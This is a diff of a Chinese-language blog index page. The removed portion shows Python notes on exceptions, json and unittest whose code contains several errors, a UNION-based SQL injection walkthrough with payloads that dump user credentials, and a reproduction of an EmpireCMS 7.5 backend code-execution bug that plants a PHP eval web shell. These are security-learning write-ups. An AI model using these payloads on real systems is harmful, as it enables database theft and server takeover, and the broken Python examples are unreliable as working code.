-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    answer = <span class="built_in">int</span>(first_number) / <span class="built_in">int</span>(second_number)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by 0!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li> 处理FileNotFoundError异常<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;alice.txt&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        contents = f_obj.read()</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    msg = <span class="string">&quot;Sorry, the file &quot;</span> + filename+ <span class="string">&quot; does not exist.&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(msg) </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="分析文本"><a href="#分析文本" class="headerlink" title="分析文本"></a>分析文本</h2><ul>
-<li>方法split()以空格为分隔符将字符串拆分成多个部分，并将这些部分都存储到一个列表中</li>
-</ul>
-<h2 id="使用多个文件"><a href="#使用多个文件" class="headerlink" title="使用多个文件"></a>使用多个文件</h2><blockquote>
-<p>python中有一个pass语句，可在代码块中使用它来让python说明都不要做</p>
-</blockquote>
-<h2 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h2><blockquote>
-<p>模块json让你能够将简单的python数据结构转储到文件中，并在程序再次运行时加载该文件中的数据。</p>
-</blockquote>
-<ul>
-<li>使用json.dump()和json.load()<blockquote>
-<p>函数json.dump()接受两个实参：要存储的数据以及可用于存储数据的文件对象。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>]</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers,f_obj)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">    nunbers = json.load(f_obj)</span><br><span class="line"><span class="built_in">print</span>(nunbers)</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>保存和读取用户生成的数据</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(username,f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back,&quot;</span>+username+<span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></li>
-<li><p>重构</p>
-<blockquote>
-<p>将代码划分为一系列完成具体工作的函数。这样的过程被称为重构。重构让代码更清晰、更易于理解、更容易扩展。</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><p>name_function.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first,last</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate a neatly formatted full name.&quot;&quot;&quot;</span></span><br><span class="line">    full_name = first + <span class="string">&#x27;&#x27;</span> + last</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure>
-<ul>
-<li>单元测试和测试用例<blockquote>
-<p>python标准库中的模块unittest提供了代码测试工具。<em>单元测试</em>用于核实函数的某个方面没有问题；<em>测试用例</em>是一组单元测试，这些单元测试一起核实函数在各种情形下的行为都符合要求。<em>全覆盖式测试用例</em>包含一整套单元测试，涵盖了各种可能的函数使用方式。</p>
-</blockquote>
-</li>
-</ul>
-<p>下面是一个只包含一个方法的测试用例，它检查函数get_formatted_name()在给定名和姓时能否正确的工作<br>test_name_function.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> name_function <span class="keyword">import</span> get_formatted_name</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NamesTestCase</span>(unittest.TestCase):</span><br><span class="line">     <span class="string">&quot;&quot;&quot;测试name_function.py&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_first_last_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;&quot;能够正确地处理像Janis Joplin这样的姓名码？&quot;&quot;&quot;</span></span><br><span class="line">        formatted_name = get_formatted_name(<span class="string">&#x27;Janis&#x27;</span>,<span class="string">&#x27;joplin&#x27;</span>)</span><br><span class="line">        self.assertEqual(formatted_name, <span class="string">&#x27;Janis Joplin&#x27;</span>)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>首先，我们导入了模块unittest和要测试的函数get_formatted_name()。然后创建了一个名为NamesTestCase的类，用于包含一系列针对get_formatted_name()的单元测试。你可随便给这个类命名，但最好让它看起来与要测试的函数相关，并包含字样Test。这个类必须继承unittest.TestCase类，这样python才知道如何运行你编写的测试。  </p>
-</blockquote>
-<blockquote>
-<p>我们运行test_name_function时，所有以test打头的方法都将自动运行。</p>
-</blockquote>
-<ul>
-<li><p>断言方法：<strong>assertEqual()</strong> 用来核实得到的结果是否与期望的结果一致。</p>
-</li>
-<li><p>添加新测试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--snip--</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_first_last_middle_name</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;能够正确地处理像Wolfgang Amadeus Mozart 这样的姓名吗？&quot;&quot;&quot;</span></span><br><span class="line">    formatted_name = get_formatted_name(<span class="string">&#x27;wolfgang&#x27;</span>,<span class="string">&#x27;mozart&#x27;</span>,<span class="string">&#x27;amadeus&#x27;</span>)</span><br><span class="line">    self.assertEqual(fortmatted_name,<span class="string">&#x27;Wolfgang Amadeus Mozart&#x27;</span>)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>方法名必须以test_打头，这样它才会在我们运行test_name_function.py时自动运行。</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h2><ul>
-<li>断言方法  </li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>assertEqual(a,b)</td>
-<td>核实a==b</td>
-</tr>
-<tr>
-<td>assertNotEqual(a,b)</td>
-<td>核实a!=b</td>
-</tr>
-<tr>
-<td>assertTrue(x)</td>
-<td>核实x为True</td>
-</tr>
-<tr>
-<td>assertFalse(x)</td>
-<td>核实x为False</td>
-</tr>
-<tr>
-<td>assertIn(item,iist)</td>
-<td>核实item在list中</td>
-</tr>
-<tr>
-<td>assertNotIn(item,list)</td>
-<td>核实item不在list中</td>
-</tr>
-</tbody></table>
-<p>survey.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnonymousSurvey</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;收集匿名调查问卷的答案&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,qusetion</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;存储一个问题，并为存储答案做准备&quot;&quot;&quot;</span></span><br><span class="line">        self.question = question</span><br><span class="line">        self.responses = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_question</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示调查问卷&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.question)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store_response</span>(<span class="params">self,new_response</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;存储单份调查答卷&quot;&quot;&quot;</span></span><br><span class="line">        self.responses.append(new_response)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_results</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示收集到的所有答卷&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Survey results:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> + response)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="comment"># 定义一个问题，并创建一个表示调查的AnonymousSurvey对象</span></span><br><span class="line">question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">my_survey = AnonymousSurvey(question)</span><br><span class="line"><span class="comment"># 显示问题并存储答案</span></span><br><span class="line">my_survey.show_question()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter &#x27;q&#x27; at any time to quit.\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = <span class="built_in">input</span>(<span class="string">&quot;Language: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        my_survey.store_response(response)</span><br><span class="line"><span class="comment"># 显示调查结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThank you to everyone who praticipated in the survey!&quot;</span>)</span><br><span class="line">my_survey.show_results()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymousSurvy</span>(unittest.TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;针对AnonymousSurvey类的测试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试单个答案会被妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        my_survey = AnonymousSurvey(question)</span><br><span class="line">        my_survey.store_response(<span class="string">&#x27;English&#x27;</span>)</span><br><span class="line">        self.assertIn(<span class="string">&#x27;English&#x27;</span>,my_survey.responses)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_responses</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试三个答案&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        my_survey = AnonymousSurvey(qusetion)</span><br><span class="line">        response = [<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            self.assertIn(response,my_survey.responses)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法setUp()<br>unittest.TestCase类包含方法setUp(),让我们只需创建这些对象一次，并在每个测试方法中使用它们。如果你在TestCase类中包含了方法setUp(),Python将先运行它，再运行各个以test_打头的方法。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survy <span class="keyword">import</span> AnonymousSurvy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymousSurvey</span>(unittest,TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;针对AnonymousSurvey类的测试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建一个调查对象和一组答案，供使用的测试方法使用&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        self.my_survey = AnonymousSurvey(question)</span><br><span class="line">        self.responses = [<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试单个答案会妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        self.my_survey.store_response(self.responses[<span class="number">0</span>])</span><br><span class="line">        self.assertIn(self.responses[<span class="number">0</span>],self.my_survey.responses)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_responses</span>[self]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试三个答案会被妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.assertIn(response,self.my_survey.responses)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" class="post-title-link" itemprop="url">SQL注入之联合查询</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-05 14:35:42 / 修改时间：14:36:10" itemprop="dateCreated datePublished" datetime="2022-11-05T14:35:42+08:00">2022-11-05</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h1><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
-<h2 id="1-页面观察"><a href="#1-页面观察" class="headerlink" title="1.  页面观察"></a>1.  页面观察</h2><p>当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了  </p>
-<h2 id="2-注入点判断"><a href="#2-注入点判断" class="headerlink" title="2. 注入点判断"></a>2. 注入点判断</h2><p>开始判断是否存在注入，输入?id=1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞  </p>
-<p>继续判断 </p>
-<p><code>?id=1&#39; and 1=1 --+ </code>  页面正常显示</p>
-<p><code>?id=1&#39; and 1=2 --+ </code> 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
-<h2 id="3-判断当前表的字段个数"><a href="#3-判断当前表的字段个数" class="headerlink" title="3. 判断当前表的字段个数"></a>3. 判断当前表的字段个数</h2><p><code>?id=1 order by 3 --+ </code><br><code>?id=1 order by 4 --+</code> ,此时显示未知的列，说明此时当前表中只有3列</p>
-<h2 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4. 判断显示位"></a>4. 判断显示位</h2><p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br><code>?id=-1&#39; union select 1,2,3 --+ </code><br>让union select前面的参数查不出来，所以id=-1’</p>
-<p>如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。</p>
-<h2 id="5-爆数据库名字"><a href="#5-爆数据库名字" class="headerlink" title="5. 爆数据库名字"></a>5. 爆数据库名字</h2><p><code>?id=-1&#39; union select 1,database(),3 --+</code></p>
-<h2 id="6-爆数据库中的表"><a href="#6-爆数据库中的表" class="headerlink" title="6. 爆数据库中的表"></a>6. 爆数据库中的表</h2><p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br>其中爆出来数据库中存在三个表</p>
-<h2 id="7-爆表中的字段"><a href="#7-爆表中的字段" class="headerlink" title="7. 爆表中的字段"></a>7. 爆表中的字段</h2><p>我们这里选择一个表，users进行进一步的获取表中的字段值<br><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+</code><br>获取到三个字段，分别为id,username,password</p>
-<h2 id="8-爆相应字段的所有数据"><a href="#8-爆相应字段的所有数据" class="headerlink" title="8. 爆相应字段的所有数据"></a>8. 爆相应字段的所有数据</h2><p><code>?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users --+</code><br>至此，一次完整的脱库过程结束了，联合查询也就结束了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/05/%E5%B8%9D%E5%9B%BDCMS%20v7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/05/%E5%B8%9D%E5%9B%BDCMS%20v7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">帝国CMS v7.5后台任意代码执行</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-05 14:30:38" itemprop="dateCreated datePublished" datetime="2022-11-05T14:30:38+08:00">2022-11-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-17 18:35:07" itemprop="dateModified" datetime="2022-11-17T18:35:07+08:00">2022-11-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。</p>
-<h1 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a>二、影响版本</h1><p>EmpireCMS&lt;=7.5</p>
-<h1 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h1><p>1、官方下载EmpireCMS V7.5 下载地址:<a target="_blank" rel="noopener" href="http://www.phome.net/download/">http://www.phome.net/download/</a></p>
-<p>2、把下载的文件中的upload下的所有目录和文件放入到网站根目录下</p>
-<p>3、修改php.ini配置文件, PHP环境中必须开启短标签,不然安装会提示无法安装</p>
-<p>4、设置php.ini中 short_open_tag = On,重启phpstudy</p>
-<h1 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h1><p>参考博客<br>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11369770.html]">https://www.cnblogs.com/yuzly/p/11369770.html]</a></p>
-<h2 id="访问后台"><a href="#访问后台" class="headerlink" title="访问后台"></a>访问后台</h2><p><img src="https://s3.bmp.ovh/imgs/2022/10/31/0c369fc2af99f697.png"></p>
-<h2 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h2><p>系统–&gt;备份与恢复数据–&gt;备份数据（这里选中一个表进行备份）–&gt;开始备份<br><img src="https://s3.bmp.ovh/imgs/2022/10/31/233cb0c1f2c3d213.png"></p>
-<h2 id="抓包改表名传马"><a href="#抓包改表名传马" class="headerlink" title="抓包改表名传马"></a>抓包改表名传马</h2><p>使用burp suite抓包<br><img src="https://s3.bmp.ovh/imgs/2022/10/31/50c0267a273e882a.png"><br>将tablename改为一句话木马<br><code>tablename[]=@eval（$_POST[1])</code></p>
-<h2 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h2><p>管理备份目录–&gt;查看备份说明–&gt;将readme.txt改为config.php–&gt;蚁剑连接<br><img src="https://s3.bmp.ovh/imgs/2022/11/05/e5880a56abdc7426.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1422,7 +1615,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1450,7 +1643,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
